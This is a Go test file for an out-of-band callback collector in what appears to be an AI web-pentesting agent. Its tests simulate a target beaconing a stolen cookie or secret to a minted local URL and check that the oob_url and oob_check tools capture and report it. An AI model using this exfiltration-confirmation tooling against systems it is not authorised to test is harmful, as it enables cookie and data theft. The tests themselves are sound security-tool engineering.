package webagent

import (
	"net/http"
	"strings"
	"testing"
)

// TestCollector_RecordsAndCorrelates: a callback to a minted URL is recorded, its exfil data captured,
// and correlated to the right token (an unrelated token sees nothing).
func TestCollector_RecordsAndCorrelates(t *testing.T) {
	c := NewCollector("127.0.0.1")
	if err := c.Start(); err != nil {
		t.Fatalf("Start: %v", err)
	}
	defer c.Stop()

	url, token := c.Mint()
	// simulate the target's browser/back-end beaconing home with exfil'd data
	resp, err := http.Get(url + "?c=FLAG%7Bstolen_cookie%7D")
	if err != nil {
		t.Fatalf("beacon: %v", err)
	}
	resp.Body.Close()

	hits := c.Hits(token)
	if len(hits) != 1 {
		t.Fatalf("want 1 hit for the token, got %d", len(hits))
	}
	if !strings.Contains(hits[0].Query, "stolen_cookie") {
		t.Errorf("exfil data not captured on the hit: %q", hits[0].Query)
	}
	// grounding: a token that never received a callback must report nothing (no invented hit — §10)
	if got := c.Hits("neverhit"); len(got) != 0 {
		t.Errorf("token correlation leaked: %d hits for an unused token", len(got))
	}
}

// TestOOBTools_Flow drives the two tools: oob_url lazily starts the collector and surfaces a URL;
// oob_check reports "nothing yet" before a hit and "CONFIRMED" (with the exfil) after one.
func TestOOBTools_Flow(t *testing.T) {
	cc := &Context{}
	out := tOOBURL(cc, nil)
	if cc.oob == nil {
		t.Fatal("oob_url did not start the collector")
	}
	defer cc.oob.Stop()
	if !strings.Contains(out, "OOB callback URL") {
		t.Errorf("oob_url did not surface a URL: %s", out)
	}

	if got := tOOBCheck(cc, map[string]any{}); !strings.Contains(got, "no OOB callbacks") {
		t.Errorf("expected the no-hits message before any callback: %s", got)
	}

	url, token := cc.oob.Mint()
	if resp, err := http.Get(url + "?c=secret-value"); err == nil {
		resp.Body.Close()
	}
	got := tOOBCheck(cc, map[string]any{"token": token})
	if !strings.Contains(got, "CONFIRMED") || !strings.Contains(got, "secret-value") {
		t.Errorf("hit not surfaced by oob_check: %s", got)
	}
}

// TestOOBCheck_NoCollector: calling oob_check before oob_url is a graceful hint, not a crash.
func TestOOBCheck_NoCollector(t *testing.T) {
	if got := tOOBCheck(&Context{}, map[string]any{}); !strings.Contains(got, "call oob_url first") {
		t.Errorf("expected a start-it-first hint: %s", got)
	}
}
